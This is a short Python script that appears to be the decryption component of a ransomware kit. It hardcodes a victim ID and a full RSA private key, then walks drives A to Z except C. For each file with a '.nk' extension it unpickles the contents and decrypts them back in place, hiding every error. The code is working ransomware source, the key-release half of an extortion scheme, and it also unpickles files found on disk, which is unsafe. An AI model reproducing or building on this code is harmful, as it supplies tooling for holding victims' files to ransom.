global privateKey
m_id = '1234567891'
privateKey = 'PrivateKey(100344468852563328383277568788371688977622772348774272957983298772109455949487464810329714452500361621275334550154550849646963775008534841807540871209536821206194226600042096399948428324203734948792080218704997693923161084983485822904338802385816489505033045901349274554160760617085801262443018996780487397363, 65537, 41467098737109916880606472610822443086820537154917888132216330937410018699055022498102745876635599642781938227594117836656983382189544060922435088839659950054780586897917792345124364319673152773189058026260608921539450389715295151826624199210066855829266164299409872579556661916956874134790991955706945615705, 36837982925894000031078817881727393467764380307266526320501383014192075493488841933727545712287553077893611865276867255155011590311087175553407233267681897242097807, 2723940370308104365558589464927161402893224153612583887357956295721793605278498870430236386149210203678334196009768746319923599618028276662025309)'

import os
import rsa
import pickle

t = privateKey.split(', ')
n = int((t[0])[11:])
e = int(t[1])
d = int(t[2])
p = int(t[3])
q = int((t[4])[:-1])

def decrypt():
    global privateKey

    pk = rsa.key.PrivateKey(n, e, d, p, q)

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            try:
                for dirpath, dirs, files in os.walk(partpath, topdown = True):
                    dirpath = dirpath + "\\"
                    for filename in files:
                        fname = dirpath + filename
                        chk = ".nk"
                        if fname[-3:] == chk:
                            nfname = fname[:-3]
                            with open(fname, 'rb') as f:
                                data = pickle.load(f)
                            os.rename(fname, nfname)
                            with open(nfname, 'wb') as f:
                                pass
                            for i in range(len(data)):
                                pt = rsa.decrypt(data[i], pk)
                                with open(nfname, 'ab') as f:
                                    f.write(pt)
            except:
                pass

decrypt()
